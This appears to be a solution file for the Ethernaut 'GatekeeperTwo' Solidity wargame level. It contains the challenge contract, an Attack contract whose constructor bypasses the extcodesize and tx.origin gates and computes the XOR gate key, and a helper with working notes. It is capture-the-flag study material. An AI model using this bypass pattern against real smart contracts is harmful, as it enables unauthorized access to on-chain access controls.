// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "One");
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0, "Two");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max, "three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack {
    GatekeeperTwo public gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeperTwo.enter(key);
    }
}

contract Converter {
    // modifier gateThree(bytes8 _gateKey) {
    // require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max, "three");
    // _;
    //type(uint64).max == 18 446 744 073 709 551 615
    //uint64(bytes8(keccak256(abi.encodePacked(sender)))) == 11 068 710 392 075 541 949
    //11068710392075541949
    //18446744073709551615
    //7378033681634009666


    function uint64_keccak(address sender) public pure returns(uint64) {
        return uint64(bytes8(keccak256(abi.encodePacked(sender))));
    }

    function uintInBytes32(uint64 _chislo) public pure returns(bytes8) {
        return bytes8(_chislo);
    }
}